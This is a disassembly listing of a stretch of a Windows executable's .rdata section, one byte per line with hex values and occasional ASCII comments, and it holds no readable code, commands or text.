.rdata:0040272D                 db  40h ; @
.rdata:0040272E                 db  19h
.rdata:0040272F                 db  1Bh
.rdata:00402730                 db  49h ; I
.rdata:00402731                 db  0Ah
.rdata:00402732                 db  22h ; "
.rdata:00402733                 db  34h ; 4
.rdata:00402734                 db    6
.rdata:00402735                 db  1Bh
.rdata:00402736                 db  0Ah
.rdata:00402737                 db    7
.rdata:00402738                 db  81h
.rdata:00402739                 db 0DDh
.rdata:0040273A                 db 0EEh
.rdata:0040273B                 db  14h
.rdata:0040273C                 db  18h
.rdata:0040273D                 db    4
.rdata:0040273E                 db    3
.rdata:0040273F                 db 0A6h
.rdata:00402740                 db  31h ; 1
.rdata:00402741                 db  81h
.rdata:00402742                 db 0E0h
.rdata:00402743                 db    7
.rdata:00402744                 db    3
.rdata:00402745                 db  89h
.rdata:00402746                 db    4
.rdata:00402747                 db  0Bh
.rdata:00402748                 db 0ADh
.rdata:00402749                 db    6
.rdata:0040274A                 db  1Bh
.rdata:0040274B                 db 0A1h
.rdata:0040274C                 db    6
.rdata:0040274D                 db  1Bh
.rdata:0040274E                 db  5Ah ; Z
.rdata:0040274F                 db  26h ; &
.rdata:00402750                 db  1Bh
.rdata:00402751                 db  7Fh ; 
.rdata:00402752                 db  18h
.rdata:00402753                 db  81h
.rdata:00402754                 db  0Ah
.rdata:00402755                 db  0Ah
.rdata:00402756                 db  1Ch
.rdata:00402757                 db 0A2h
.rdata:00402758                 db    4
.rdata:00402759                 db  1Bh
.rdata:0040275A                 db  9Dh
.rdata:0040275B                 db  0Bh
.rdata:0040275C                 db  1Bh
.rdata:0040275D                 db 0A9h
.rdata:0040275E                 db  27h ; '
.rdata:0040275F                 db  0Ch
.rdata:00402760                 db  2Fh ; /
.rdata:00402761                 db  21h ; !
.rdata:00402762                 db  22h ; "
.rdata:00402763                 db 0D1h
.rdata:00402764                 db  0Bh
.rdata:00402765                 db  1Bh
.rdata:00402766                 db 0FCh
.rdata:00402767                 db  24h ; $
.rdata:00402768                 db  0Ch
.rdata:00402769                 db  7Fh ; 
.rdata:0040276A                 db  1Eh
.rdata:0040276B                 db  80h
.rdata:0040276C                 db  30h ; 0
.rdata:0040276D                 db  1Ch
.rdata:0040276E                 db  3Eh ; >
.rdata:0040276F                 db  0Ah
.rdata:00402770                 db  1Ch
.rdata:00402771                 db  49h ; I
.rdata:00402772                 db  27h ; '
.rdata:00402773                 db  1Ch
.rdata:00402774                 db  6Fh ; o
.rdata:00402775                 db  1Ch
.rdata:00402776                 db  80h
.rdata:00402777                 db  90h
.rdata:00402778                 db  23h ; #
.rdata:00402779                 db  18h
.rdata:0040277A                 db    6
.rdata:0040277B                 db  1Ch
.rdata:0040277C                 db  93h
.rdata:0040277D                 db  2Eh ; .
.rdata:0040277E                 db    5
.rdata:0040277F                 db  50h ; P
.rdata:00402780                 db  1Bh
.rdata:00402781                 db  15h
.rdata:00402782                 db  0Eh
.rdata:00402783                 db 0FFh
.rdata:00402784                 db  10h
.rdata:00402785                 db 0D9h
.rdata:00402786                 db 0F8h
.rdata:00402787                 db  80h
.rdata:00402788                 db 0F1h
.rdata:00402789                 db  26h ; &
.rdata:0040278A                 db  50h ; P
.rdata:0040278B                 db  4Dh ; M
.rdata:0040278C                 db    0
.rdata:0040278D                 db  9Eh
.rdata:0040278E                 db  47h ; G
.rdata:0040278F                 db  82h
.rdata:00402790                 db 0F1h
.rdata:00402791                 db 0F1h
.rdata:00402792                 db  1Fh
.rdata:00402793                 db  26h ; &
.rdata:00402794                 db 0A2h
.rdata:00402795                 db  4Eh ; N
.rdata:00402796                 db    5
.rdata:00402797                 db 0ABh
.rdata:00402798                 db 0FFh
.rdata:00402799                 db    6
.rdata:0040279A                 db 0E0h
.rdata:0040279B                 db 0FFh
.rdata:0040279C                 db  21h ; !
.rdata:0040279D                 db 0B6h
.rdata:0040279E                 db 0D3h
.rdata:0040279F                 db    3
.rdata:004027A0                 db  49h ; I
.rdata:004027A1                 db    5
.rdata:004027A2                 db  22h ; "
.rdata:004027A3                 db  8Eh
.rdata:004027A4                 db    5
.rdata:004027A5                 db    3
.rdata:004027A6                 db  53h ; S
.rdata:004027A7                 db  35h ; 5
.rdata:004027A8                 db  0Bh
.rdata:004027A9                 db  58h ; X
.rdata:004027AA                 db  0Eh
.rdata:004027AB                 db  23h ; #
.rdata:004027AC                 db 0C5h
.rdata:004027AD                 db    8
.rdata:004027AE                 db    3
.rdata:004027AF                 db  9Eh
.rdata:004027B0                 db  3Ah ; :
.rdata:004027B1                 db  0Bh
.rdata:004027B2                 db 0A8h
.rdata:004027B3                 db  0Bh
.rdata:004027B4                 db  2Ah ; *
.rdata:004027B5                 db  0Ah
.rdata:004027B6                 db    5
.rdata:004027B7                 db    3
.rdata:004027B8                 db 0E8h
.rdata:004027B9                 db  41h ; A
.rdata:004027BA                 db  0Bh
.rdata:004027BB                 db 0F9h
.rdata:004027BC                 db    8
.rdata:004027BD                 db  23h ; #
.rdata:004027BE                 db  71h ; q
.rdata:004027BF                 db  0Bh
.rdata:004027C0                 db    4
.rdata:004027C1                 db  3Ch ; <
.rdata:004027C2                 db  40h ; @
.rdata:004027C3                 db  23h ; #
.rdata:004027C4                 db 0BCh
.rdata:004027C5                 db  10h
.rdata:004027C6                 db    4
.rdata:004027C7                 db  8Ch
.rdata:004027C8                 db  30h ; 0
.rdata:004027C9                 db  23h ; #
.rdata:004027CA                 db 0FCh
.rdata:004027CB                 db  1Ch
.rdata:004027CC                 db  24h ; $
.rdata:004027CD                 db  17h
.rdata:004027CE                 db    5
.rdata:004027CF                 db  0Ch
.rdata:004027D0                 db 0AEh
.rdata:004027D1                 db  22h ; "
.rdata:004027D2                 db  80h
.rdata:004027D3                 db  1Fh
.rdata:004027D4                 db  24h ; $
.rdata:004027D5                 db  40h ; @
.rdata:004027D6                 db  1Dh
.rdata:004027D7                 db  80h
.rdata:004027D8                 db  77h ; w
.rdata:004027D9                 db  24h ; $
.rdata:004027DA                 db  5Eh ; ^
.rdata:004027DB                 db  0Ch
.rdata:004027DC                 db  86h
.rdata:004027DD                 db 0E0h
.rdata:004027DE                 db    0
.rdata:004027DF                 db    0
.rdata:004027E0                 db    0
.rdata:004027E1                 db    0
.rdata:004027E2                 db    0
.rdata:004027E3                 db    0
.rdata:004027E4                 db  0Ch
.rdata:004027E5                 db 0F4h
.rdata:004027E6                 db    4
.rdata:004027E7                 db  29h ; )
.rdata:004027E8                 db  0Ch
.rdata:004027E9                 db  1Bh
.rdata:004027EA                 db  24h ; $
.rdata:004027EB                 db  90h
.rdata:004027EC                 db  20h
.rdata:004027ED                 db  2Ch ; ,
.rdata:004027EE                 db  7Bh ; {
.rdata:004027EF                 db    5
.rdata:004027F0                 db  2Ch ; ,
.rdata:004027F1                 db  6Bh ; k
.rdata:004027F2                 db    5
.rdata:004027F3                 db  24h ; $
.rdata:004027F4                 db 0ABh
.rdata:004027F5                 db  0Fh
.rdata:004027F6                 db    0
.rdata:004027F7                 db  38h ; 8
.rdata:004027F8                 db 0FFh
.rdata:004027F9                 db  2Dh ; -
.rdata:004027FA                 db  19h
.rdata:004027FB                 db  7Fh ; 
.rdata:004027FC                 db  2Ch ; ,
.rdata:004027FD                 db 0FFh
.rdata:004027FE                 db  4Eh ; N
.rdata:004027FF                 db  27h ; '
.rdata:00402800                 db  37h ; 7
.rdata:00402801                 db  98h
.rdata:00402802                 db  26h ; &
.rdata:00402803                 db  9Dh
.rdata:00402804                 db  9Ah
.rdata:00402805                 db    5
.rdata:00402806                 db 0ADh
.rdata:00402807                 db 0FFh
.rdata:00402808                 db  25h ; %
.rdata:00402809                 db 0F5h
.rdata:0040280A                 db  5Ah ; Z
.rdata:0040280B                 db  1Fh
.rdata:0040280C                 db  6Fh ; o
.rdata:0040280D                 db  40h ; @
.rdata:0040280E                 db  0Ah
.rdata:0040280F                 db  20h
.rdata:00402810                 db  30h ; 0
.rdata:00402811                 db  19h
.rdata:00402812                 db 0F0h
.rdata:00402813                 db  1Eh
.rdata:00402814                 db  80h
.rdata:00402815                 db  10h
.rdata:00402816                 db  0Ah
.rdata:00402817                 db  6Fh ; o
.rdata:00402818                 db  31h ; 1
.rdata:00402819                 db  1Ah
.rdata:0040281A                 db  40h ; @
.rdata:0040281B                 db  20h
.rdata:0040281C                 db    2
.rdata:0040281D                 db 0F0h
.rdata:0040281E                 db  80h
.rdata:0040281F                 db  1Ah
.rdata:00402820                 db 0E0h
.rdata:00402821                 db  18h
.rdata:00402822                 db  0Dh
.rdata:00402823                 db    1
.rdata:00402824                 db    4
.rdata:00402825                 db  80h
.rdata:00402826                 db  60h ; `
.rdata:00402827                 db  1Ah
.rdata:00402828                 db 0FDh
.rdata:00402829                 db    9
.rdata:0040282A                 db    3
.rdata:0040282B                 db  96h
.rdata:0040282C                 db  2Ah ; *
.rdata:0040282D                 db  1Bh
.rdata:0040282E                 db  30h ; 0
.rdata:0040282F                 db  18h
.rdata:00402830                 db  80h
.rdata:00402831                 db  0Eh
.rdata:00402832                 db    3
.rdata:00402833                 db 0D9h
.rdata:00402834                 db  87h
.rdata:00402835                 db  1Bh
.rdata:00402836                 db 0D0h
.rdata:00402837                 db  18h
.rdata:00402838                 db  33h ; 3
.rdata:00402839                 db  4Ah ; J
.rdata:0040283A                 db    5
.rdata:0040283B                 db    4
.rdata:0040283C                 db  7Dh ; }
.rdata:0040283D                 db  33h ; 3
.rdata:0040283E                 db  14h
.rdata:0040283F                 db  50h ; P
.rdata:00402840                 db  19h
.rdata:00402841                 db  33h ; 3
.rdata:00402842                 db  9Bh
.rdata:00402843                 db    4
.rdata:00402844                 db    4
.rdata:00402845                 db 0CDh
.rdata:00402846                 db  29h ; )
.rdata:00402847                 db  30h ; 0
.rdata:00402848                 db 0A1h
.rdata:00402849                 db  0Ah
.rdata:0040284A                 db  0Ch
.rdata:0040284B                 db 0D1h
.rdata:0040284C                 db  1Fh
.rdata:0040284D                 db    5
.rdata:0040284E                 db  1Fh
.rdata:0040284F                 db  25h ; %
.rdata:00402850                 db  1Eh
.rdata:00402851                 db  89h
.rdata:00402852                 db  13h
.rdata:00402853                 db  2Ch ; ,
.rdata:00402854                 db  60h ; `
.rdata:00402855                 db  15h
.rdata:00402856                 db    5
.rdata:00402857                 db  6Ch ; l
.rdata:00402858                 db  27h ; '
.rdata:00402859                 db    8
.rdata:0040285A                 db  12h
.rdata:0040285B                 db 0FFh
.rdata:0040285C                 db  30h ; 0
.rdata:0040285D                 db  33h ; 3
.rdata:0040285E                 db 0FDh
.rdata:0040285F                 db    7
.rdata:00402860                 db 0BEh
.rdata:00402861                 db 0FFh
.rdata:00402862                 db  2Dh ; -
.rdata:00402863                 db  1Ah
.rdata:00402864                 db 0FFh
.rdata:00402865                 db  2Eh ; .
.rdata:00402866                 db  19h
.rdata:00402867                 db  93h
.rdata:00402868                 db  31h ; 1
.rdata:00402869                 db  36h ; 6
.rdata:0040286A                 db  0Bh
.rdata:0040286B                 db  80h
.rdata:0040286C                 db 0F0h
.rdata:0040286D                 db  31h ; 1
.rdata:0040286E                 db  3Ch ; <
.rdata:0040286F                 db 0EDh
.rdata:00402870                 db  0Bh
.rdata:00402871                 db  19h
.rdata:00402872                 db  27h ; '
.rdata:00402873                 db  1Ah
.rdata:00402874                 db 0E0h
.rdata:00402875                 db  19h
.rdata:00402876                 db  81h
.rdata:00402877                 db  60h ; `
.rdata:00402878                 db  60h ; `
.rdata:00402879                 db  1Ah
.rdata:0040287A                 db 0FBh
.rdata:0040287B                 db  0Bh
.rdata:0040287C                 db  0Bh
.rdata:0040287D                 db  66h ; f
.rdata:0040287E                 db  2Ah ; *
.rdata:0040287F                 db  32h ; 2
.rdata:00402880                 db 0A0h
.rdata:00402881                 db  18h
.rdata:00402882                 db  0Bh
.rdata:00402883                 db 0A8h
.rdata:00402884                 db  88h
.rdata:00402885                 db  33h ; 3
.rdata:00402886                 db  40h ; @
.rdata:00402887                 db  1Ch
.rdata:00402888                 db  0Ch
.rdata:00402889                 db  4Ch ; L
.rdata:0040288A                 db  34h ; 4
.rdata:0040288B                 db  33h ; 3
.rdata:0040288C                 db  90h
.rdata:0040288D                 db  1Dh
.rdata:0040288E                 db  80h
.rdata:0040288F                 db  33h ; 3
.rdata:00402890                 db  0Ch
.rdata:00402891                 db  9Eh
.rdata:00402892                 db  1Fh
.rdata:00402893                 db  35h ; 5
.rdata:00402894                 db 0E0h
.rdata:00402895                 db  13h
.rdata:00402896                 db  0Ch
.rdata:00402897                 db 0D0h
.rdata:00402898                 db  50h ; P
.rdata:00402899                 db  24h ; $
.rdata:0040289A                 db  89h
.rdata:0040289B                 db  1Dh
.rdata:0040289C                 db  0Dh
.rdata:0040289D                 db  3Dh ; =
.rdata:0040289E                 db  1Dh
.rdata:0040289F                 db  0Fh
.rdata:004028A0                 db 0D9h
.rdata:004028A1                 db 0FFh
.rdata:004028A2                 db    6
.rdata:004028A3                 db 0BCh
.rdata:004028A4                 db 0FFh
.rdata:004028A5                 db  0Fh
.rdata:004028A6                 db  88h
.rdata:004028A7                 db 0FFh
.rdata:004028A8                 db  10h
.rdata:004028A9                 db  84h
.rdata:004028AA                 db 0FFh
.rdata:004028AB                 db  26h ; &
.rdata:004028AC                 db  54h ; T
.rdata:004028AD                 db 0CAh
.rdata:004028AE                 db  21h ; !
.rdata:004028AF                 db 0C0h
.rdata:004028B0                 db 0CAh
.rdata:004028B1                 db  1Ah
.rdata:004028B2                 db 0BAh
.rdata:004028B3                 db  26h ; &
.rdata:004028B4                 db  22h ; "
.rdata:004028B5                 db 0B0h
.rdata:004028B6                 db  29h ; )
.rdata:004028B7                 db  1Bh
.rdata:004028B8                 db    9
.rdata:004028B9                 db  27h ; '
.rdata:004028BA                 db  2Ah ; *
.rdata:004028BB                 db 0D0h
.rdata:004028BC                 db  18h
.rdata:004028BD                 db  42h ; B
.rdata:004028BE                 db  4Ah ; J
.rdata:004028BF                 db    6
.rdata:004028C0                 db  13h
.rdata:004028C1                 db  7Eh ; ~
.rdata:004028C2                 db  82h
.rdata:004028C3                 db  2Bh ; +
.rdata:004028C4                 db  70h ; p
.rdata:004028C5                 db  18h
.rdata:004028C6                 db  14h
.rdata:004028C7                 db  18h
.rdata:004028C8                 db  38h ; 8
.rdata:004028C9                 db  2Bh ; +
.rdata:004028CA                 db 0C0h
.rdata:004028CB                 db  19h
.rdata:004028CC                 db  84h
.rdata:004028CD                 db    9
.rdata:004028CE                 db    9
.rdata:004028CF                 db    9
.rdata:004028D0                 db    9
.rdata:004028D1                 db  39h ; 9
.rdata:004028D2                 db  1Ch
.rdata:004028D3                 db  3Eh ; >
.rdata:004028D4                 db  4Fh ; O
.rdata:004028D5                 db  14h
.rdata:004028D6                 db 0BDh
.rdata:004028D7                 db  33h ; 3
.rdata:004028D8                 db    5
.rdata:004028D9                 db  50h ; P
.rdata:004028DA                 db  1Ch
.rdata:004028DB                 db  24h ; $
.rdata:004028DC                 db 0A9h
.rdata:004028DD                 db  15h
.rdata:004028DE                 db  80h
.rdata:004028DF                 db 0F1h
.rdata:004028E0                 db  15h
.rdata:004028E1                 db  22h ; "
.rdata:004028E2                 db 0FFh
.rdata:004028E3                 db  16h
.rdata:004028E4                 db  51h ; Q
.rdata:004028E5                 db 0FFh
.rdata:004028E6                 db  17h
.rdata:004028E7                 db  50h ; P
.rdata:004028E8                 db 0FFh
.rdata:004028E9                 db  18h
.rdata:004028EA                 db  4Dh ; M
.rdata:004028EB                 db 0FFh
.rdata:004028EC                 db  36h ; 6
.rdata:004028ED                 db  7Ch ; |
.rdata:004028EE                 db 0D2h
.rdata:004028EF                 db  41h ; A
.rdata:004028F0                 db    0
.rdata:004028F1                 db 0FFh
.rdata:004028F2                 db  41h ; A
.rdata:004028F3                 db 0FFh
.rdata:004028F4                 db 0ADh
.rdata:004028F5                 db  1Bh
.rdata:004028F6                 db  9Ch
.rdata:004028F7                 db  34h ; 4
.rdata:004028F8                 db  42h ; B
.rdata:004028F9                 db 0E0h
.rdata:004028FA                 db  18h
.rdata:004028FB                 db  80h
.rdata:004028FC                 db  30h ; 0
.rdata:004028FD                 db  1Bh
.rdata:004028FE                 db 0E9h
.rdata:004028FF                 db  37h ; 7
.rdata:00402900                 db  43h ; C
.rdata:00402901                 db  30h ; 0
.rdata:00402902                 db  18h
.rdata:00402903                 db  84h
.rdata:00402904                 db    9
.rdata:00402905                 db  70h ; p
.rdata:00402906                 db  70h ; p
.rdata:00402907                 db    9
.rdata:00402908                 db  39h ; 9
.rdata:00402909                 db  43h ; C
.rdata:0040290A                 db  4Dh ; M
.rdata:0040290B                 db  50h ; P
.rdata:0040290C                 db  1Ch
.rdata:0040290D                 db  8Dh
.rdata:0040290E                 db  33h ; 3
.rdata:0040290F                 db  43h ; C
.rdata:00402910                 db 0D0h
.rdata:00402911                 db  1Dh
.rdata:00402912                 db  43h ; C
.rdata:00402913                 db 0EEh
.rdata:00402914                 db  0Ch
.rdata:00402915                 db  82h
.rdata:00402916                 db 0F1h
.rdata:00402917                 db 0F1h
.rdata:00402918                 db  1Fh
.rdata:00402919                 db  24h ; $
.rdata:0040291A                 db 0BAh
.rdata:0040291B                 db  4Fh ; O
.rdata:0040291C                 db  46h ; F
.rdata:0040291D                 db  55h ; U
.rdata:0040291E                 db 0D1h
.rdata:0040291F                 db  1Eh
.rdata:00402920                 db  3Bh ; ;
.rdata:00402921                 db 0FFh
.rdata:00402922                 db    1
.rdata:00402923                 db  5Bh ; [
.rdata:00402924                 db  37h ; 7
.rdata:00402925                 db    5
.rdata:00402926                 db 0ADh
.rdata:00402927                 db 0FFh
.rdata:00402928                 db  16h
.rdata:00402929                 db  29h ; )
.rdata:0040292A                 db 0FFh
.rdata:0040292B                 db  4Fh ; O
.rdata:0040292C                 db  30h ; 0
.rdata:0040292D                 db  80h
.rdata:0040292E                 db  19h
.rdata:0040292F                 db 0F0h
.rdata:00402930                 db 0CAh
.rdata:00402931                 db  22h ; "
.rdata:00402932                 db  8Ah
.rdata:00402933                 db  26h ; &
.rdata:00402934                 db  1Ah
.rdata:00402935                 db 0E0h
.rdata:00402936                 db  29h ; )
.rdata:00402937                 db  22h ; "
.rdata:00402938                 db 0D9h
.rdata:00402939                 db  27h ; '
.rdata:0040293A                 db  3Ah ; :
.rdata:0040293B                 db  70h ; p
.rdata:0040293C                 db  17h
.rdata:0040293D                 db  23h ; #
.rdata:0040293E                 db  17h
.rdata:0040293F                 db  89h
.rdata:00402940                 db  3Bh ; ;
.rdata:00402941                 db  10h
.rdata:00402942                 db  20h
.rdata:00402943                 db  23h ; #
.rdata:00402944                 db 0C0h
.rdata:00402945                 db  30h ; 0
.rdata:00402946                 db  33h ; 3
.rdata:00402947                 db  90h
.rdata:00402948                 db  1Fh
.rdata:00402949                 db  24h ; $
.rdata:0040294A                 db  0Fh
.rdata:0040294B                 db  81h
.rdata:0040294C                 db  4Bh ; K
.rdata:0040294D                 db  99h
.rdata:0040294E                 db  1Bh
.rdata:0040294F                 db  4Bh ; K
.rdata:00402950                 db 0BDh
.rdata:00402951                 db    4
.rdata:00402952                 db  44h ; D
.rdata:00402953                 db    1
.rdata:00402954                 db    5
.rdata:00402955                 db  40h ; @
.rdata:00402956                 db  84h
.rdata:00402957                 db    6
.rdata:00402958                 db  4Bh ; K
.rdata:00402959                 db 0CCh
.rdata:0040295A                 db  48h ; H
.rdata:0040295B                 db  2Fh ; /
.rdata:0040295C                 db  50h ; P
.rdata:0040295D                 db 0D0h
.rdata:0040295E                 db  3Fh ; ?
.rdata:0040295F                 db 0E2h
.rdata:00402960                 db  9Dh
.rdata:00402961                 db  40h ; @
.rdata:00402962                 db  81h
.rdata:00402963                 db    4
.rdata:00402964                 db  2Fh ; /
.rdata:00402965                 db    1
.rdata:00402966                 db 0FFh
.rdata:00402967                 db    5
.rdata:00402968                 db 0ADh
.rdata:00402969                 db 0FFh
.rdata:0040296A                 db    6
.rdata:0040296B                 db 0FAh
.rdata:0040296C                 db 0FFh
.rdata:0040296D                 db  50h ; P
.rdata:0040296E                 db  80h
.rdata:0040296F                 db 0E9h
.rdata:00402970                 db  2Ah ; *
.rdata:00402971                 db  59h ; Y
.rdata:00402972                 db  27h ; '
.rdata:00402973                 db  3Ah ; :
.rdata:00402974                 db  20h
.rdata:00402975                 db  26h ; &
.rdata:00402976                 db  2Ah ; *
.rdata:00402977                 db 0A6h
.rdata:00402978                 db  2Ah ; *
.rdata:00402979                 db  3Ah ; :
.rdata:0040297A                 db  70h ; p
.rdata:0040297B                 db  23h ; #
.rdata:0040297C                 db  2Ah ; *
.rdata:0040297D                 db 0F3h
.rdata:0040297E                 db  7Dh ; }
.rdata:0040297F                 db  52h ; R
.rdata:00402980                 db  80h
.rdata:00402981                 db  2Ch ; ,
.rdata:00402982                 db  33h ; 3
.rdata:00402983                 db  6Ch ; l
.rdata:00402984                 db  3Bh ; ;
.rdata:00402985                 db  80h
.rdata:00402986                 db  3Fh ; ?
.rdata:00402987                 db  52h ; R
.rdata:00402988                 db 0E8h
.rdata:00402989                 db  10h
.rdata:0040298A                 db  2Bh ; +
.rdata:0040298B                 db 0E8h
.rdata:0040298C                 db  27h ; '
.rdata:0040298D                 db  53h ; S
.rdata:0040298E                 db  1Fh
.rdata:0040298F                 db  16h
.rdata:00402990                 db  80h
.rdata:00402991                 db 0F9h
.rdata:00402992                 db  5Bh ; [
.rdata:00402993                 db    2
.rdata:00402994                 db    4
.rdata:00402995                 db  2Ch ; ,
.rdata:00402996                 db  2Ah ; *
.rdata:00402997                 db  35h ; 5
.rdata:00402998                 db  53h ; S
.rdata:00402999                 db  6Fh ; o
.rdata:0040299A                 db  15h
.rdata:0040299B                 db  80h
.rdata:0040299C                 db 0F1h
.rdata:0040299D                 db  5Bh ; [
.rdata:0040299E                 db  45h ; E
.rdata:0040299F                 db    5
.rdata:004029A0                 db  80h
.rdata:004029A1                 db 0F1h
.rdata:004029A2                 db  2Ch ; ,
.rdata:004029A3                 db  7Bh ; {
.rdata:004029A4                 db  31h ; 1
.rdata:004029A5                 db    8
.rdata:004029A6                 db  4Ah ; J
.rdata:004029A7                 db 0FFh
.rdata:004029A8                 db  57h ; W
.rdata:004029A9                 db  90h
.rdata:004029AA                 db  97h
.rdata:004029AB                 db  5Ch ; \
.rdata:004029AC                 db 0D1h
.rdata:004029AD                 db  4Fh ; O
.rdata:004029AE                 db  5Dh ; ]
.rdata:004029AF                 db  22h ; "
.rdata:004029B0                 db  4Fh ; O
.rdata:004029B1                 db  87h
.rdata:004029B2                 db  7Eh ; ~
.rdata:004029B3                 db  27h ; '
.rdata:004029B4                 db  12h
.rdata:004029B5                 db  27h ; '
.rdata:004029B6                 db  4Ch ; L
.rdata:004029B7                 db  46h ; F
.rdata:004029B8                 db 0B8h
.rdata:004029B9                 db  44h ; D
.rdata:004029BA                 db  5Dh ; ]
.rdata:004029BB                 db 0C0h
.rdata:004029BC                 db    5
.rdata:004029BD                 db  8Eh
.rdata:004029BE                 db  26h ; &
.rdata:004029BF                 db 0B8h
.rdata:004029C0                 db  24h ; $
.rdata:004029C1                 db  34h ; 4
.rdata:004029C2                 db  24h ; $
.rdata:004029C3                 db 0BFh
.rdata:004029C4                 db  23h ; #
.rdata:004029C5                 db  34h ; 4
.rdata:004029C6                 db  24h ; $
.rdata:004029C7                 db    0
.rdata:004029C8                 db  25h ; %
.rdata:004029C9                 db 0B8h
.rdata:004029CA                 db  44h ; D
.rdata:004029CB                 db  4Ch ; L
.rdata:004029CC                 db  46h ; F
.rdata:004029CD                 db  5Dh ; ]
.rdata:004029CE                 db 0C0h
.rdata:004029CF                 db    8
.rdata:004029D0                 db  5Dh ; ]
.rdata:004029D1                 db 0D4h
.rdata:004029D2                 db    5
.rdata:004029D3                 db 0A0h
.rdata:004029D4                 db  24h ; $
.rdata:004029D5                 db  34h ; 4
.rdata:004029D6                 db  24h ; $
.rdata:004029D7                 db  89h
.rdata:004029D8                 db  23h ; #
.rdata:004029D9                 db 0BFh
.rdata:004029DA                 db  23h ; #
.rdata:004029DB                 db  89h
.rdata:004029DC                 db  23h ; #
.rdata:004029DD                 db  34h ; 4
.rdata:004029DE                 db  24h ; $
.rdata:004029DF                 db  4Ch ; L
.rdata:004029E0                 db  46h ; F
.rdata:004029E1                 db  9Dh
.rdata:004029E2                 db  45h ; E
.rdata:004029E3                 db  7Eh ; ~
.rdata:004029E4                 db  27h ; '
.rdata:004029E5                 db  7Eh ; ~
.rdata:004029E6                 db  27h ; '
.rdata:004029E7                 db  70h ; p
.rdata:004029E8                 db  49h ; I
.rdata:004029E9                 db 0F0h
.rdata:004029EA                 db  27h ; '
.rdata:004029EB                 db  68h ; h
.rdata:004029EC                 db  28h ; (
.rdata:004029ED                 db  70h ; p
.rdata:004029EE                 db  29h ; )
.rdata:004029EF                 db  70h ; p
.rdata:004029F0                 db  69h ; i
.rdata:004029F1                 db  68h ; h
.rdata:004029F2                 db  48h ; H
.rdata:004029F3                 db 0F0h
.rdata:004029F4                 db  47h ; G
.rdata:004029F5                 db  5Dh ; ]
.rdata:004029F6                 db 0FEh
.rdata:004029F7                 db    6
.rdata:004029F8                 db  87h
.rdata:004029F9                 db  68h ; h
.rdata:004029FA                 db  28h ; (
.rdata:004029FB                 db  7Eh ; ~
.rdata:004029FC                 db  27h ; '
.rdata:004029FD                 db  4Ch ; L
.rdata:004029FE                 db  26h ; &
.rdata:004029FF                 db  9Dh
.rdata:00402A00                 db  25h ; %
.rdata:00402A01                 db  5Eh ; ^
.rdata:00402A02                 db  12h
.rdata:00402A03                 db    4
.rdata:00402A04                 db  5Eh ; ^
.rdata:00402A05                 db  10h
.rdata:00402A06                 db    4
.rdata:00402A07                 db  5Eh ; ^
.rdata:00402A08                 db  0Eh
.rdata:00402A09                 db    4
.rdata:00402A0A                 db  85h
.rdata:00402A0B                 db  70h ; p
.rdata:00402A0C                 db  29h ; )
.rdata:00402A0D                 db  7Eh ; ~
.rdata:00402A0E                 db  47h ; G
.rdata:00402A0F                 db  4Ch ; L
.rdata:00402A10                 db  46h ; F
.rdata:00402A11                 db  5Eh ; ^
.rdata:00402A12                 db  16h
.rdata:00402A13                 db  0Ch
.rdata:00402A14                 db  83h
.rdata:00402A15                 db 0F0h
.rdata:00402A16                 db  27h ; '
.rdata:00402A17                 db  7Eh ; ~
.rdata:00402A18                 db  27h ; '
.rdata:00402A19                 db  5Eh ; ^
.rdata:00402A1A                 db  0Ah
.rdata:00402A1B                 db    8
.rdata:00402A1C                 db  81h
.rdata:00402A1D                 db 0F0h
.rdata:00402A1E                 db  47h ; G
.rdata:00402A1F                 db  5Eh ; ^
.rdata:00402A20                 db  0Eh
.rdata:00402A21                 db    8
.rdata:00402A22                 db  5Eh ; ^
.rdata:00402A23                 db  46h ; F
.rdata:00402A24                 db    4
.rdata:00402A25                 db  5Eh ; ^
.rdata:00402A26                 db  3Ch ; <
.rdata:00402A27                 db    5
.rdata:00402A28                 db  84h
.rdata:00402A29                 db  48h ; H
.rdata:00402A2A                 db  70h ; p
.rdata:00402A2B                 db  49h ; I
.rdata:00402A2C                 db  68h ; h
.rdata:00402A2D                 db  48h ; H
.rdata:00402A2E                 db  5Dh ; ]
.rdata:00402A2F                 db 0F4h
.rdata:00402A30                 db  66h ; f
.rdata:00402A31                 db  85h
.rdata:00402A32                 db  70h ; p
.rdata:00402A33                 db  49h ; I
.rdata:00402A34                 db  99h
.rdata:00402A35                 db  2Ch ; ,
.rdata:00402A36                 db  39h ; 9
.rdata:00402A37                 db  2Bh ; +
.rdata:00402A38                 db  5Eh ; ^
.rdata:00402A39                 db 0C0h
.rdata:00402A3A                 db    6
.rdata:00402A3B                 db  5Eh ; ^
.rdata:00402A3C                 db 0AAh
.rdata:00402A3D                 db    6
.rdata:00402A3E                 db  83h
.rdata:00402A3F                 db  70h ; p
.rdata:00402A40                 db  29h ; )
.rdata:00402A41                 db  12h
.rdata:00402A42                 db  27h ; '
.rdata:00402A43                 db  5Dh ; ]
.rdata:00402A44                 db 0C8h
.rdata:00402A45                 db    6
.rdata:00402A46                 db  81h
.rdata:00402A47                 db  70h ; p
.rdata:00402A48                 db  49h ; I
.rdata:00402A49                 db  5Eh ; ^
.rdata:00402A4A                 db 0C6h
.rdata:00402A4B                 db    8
.rdata:00402A4C                 db  81h
.rdata:00402A4D                 db  99h
.rdata:00402A4E                 db  2Ch ; ,
.rdata:00402A4F                 db  5Eh ; ^
.rdata:00402A50                 db 0D4h
.rdata:00402A51                 db    4
.rdata:00402A52                 db  5Eh ; ^
.rdata:00402A53                 db 0B6h
.rdata:00402A54                 db    4
.rdata:00402A55                 db  87h
.rdata:00402A56                 db  99h
.rdata:00402A57                 db  2Ch ; ,
.rdata:00402A58                 db 0FBh
.rdata:00402A59                 db  2Eh ; .
.rdata:00402A5A                 db  24h ; $
.rdata:00402A5B                 db  2Eh ; .
.rdata:00402A5C                 db  99h
.rdata:00402A5D                 db  2Ch ; ,
.rdata:00402A5E                 db  5Eh ; ^
.rdata:00402A5F                 db 0C0h
.rdata:00402A60                 db  0Eh
.rdata:00402A61                 db  5Eh ; ^
.rdata:00402A62                 db 0CCh
.rdata:00402A63                 db    8
.rdata:00402A64                 db  5Fh ; _
.rdata:00402A65                 db    0
.rdata:00402A66                 db    4
.rdata:00402A67                 db  5Eh ; ^
.rdata:00402A68                 db 0F6h
.rdata:00402A69                 db    4
.rdata:00402A6A                 db  83h
.rdata:00402A6B                 db  70h ; p
.rdata:00402A6C                 db  29h ; )
.rdata:00402A6D                 db    0
.rdata:00402A6E                 db  2Ah ; *
.rdata:00402A6F                 db  5Fh ; _
.rdata:00402A70                 db  0Ch
.rdata:00402A71                 db    6
.rdata:00402A72                 db  5Eh ; ^
